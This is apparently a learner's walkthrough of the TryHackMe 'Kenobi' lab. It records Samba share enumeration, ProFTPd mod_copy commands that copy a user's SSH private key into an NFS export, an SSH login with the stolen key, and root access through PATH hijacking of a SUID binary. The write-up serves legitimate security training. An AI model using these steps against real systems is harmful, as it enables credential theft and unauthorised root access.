# TryHackMe Room: Kenobi

# Date:
    06/13/2025

## Objective 
This is a walkthrough on exploiting a linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate privileges with apth variable manipulation 

## Recon:
### Nmap scan
```bash
nmap -T4 -sC -sV [target]
```

There are seven ports open in the machine.
I believe that I'm really interested in this one 

```bash
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
```
Because of the given description for this room. 


## Enumerate Samba for shares 

According to the room, we can use nmap for enumerating the machine for SMB shares.

Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse [target]
```
3 shares have been found using that command against the target system.

Account used: guest

Shares are: IPC, anonymous, and print

## To inspect the SMB shares
```bash
smbclient //[target]/anonymous
```
Once I was connected, I had to list the files I could see
I could only see log.txt

## Gain initial access with ProFtpd
ProFtpd is a free open-source FTP server with Unix and Windows sysmte. It has vulnerabilities to it. 

I used netcat to see which version is running on the ftp server
```bash
nc [target] 21
```
Then searchsploit for that vulnerability

Found multiple exploits that can be  used. The room told me to netcat back into the FTP port, and copy the SSH, RSA key from kenobi through these commands

```bash
SITE CPFR /home/kenobi/.ssh/id_rsa

SITE CPTO /var/tmp/id_rsa
```

Then mount the value of the key to a directory in my local machine

Run in sudo
```bash
mkdir /mnt/kenobiNFS
mount [target]:/var /mnt/kenobiNFS

ls -la /tmp/kenobiNFS
```
Now we copy the rsa key vlaue and use it for logging in

```bash
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@[target]
```

Found the user flag in kenobi@kenobi

## Privilege escalation with Path Variable Manipulation

This room starts off with talking about what SUID, SGID, and sticky bits are 

SUID Bit: User executes the file with permissions of the file owner

SGID Bit: User executes the file with the permission of the group owner. For directories, file created in directory gets the same group owner 

Sticky Bit: For files, it has no meaning but for directories it prevents the user from deleting files from other users. 

Do this in the /tmp folder

```bash
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

This manipulates the file path and gets your root user.

Found the root flag in /root

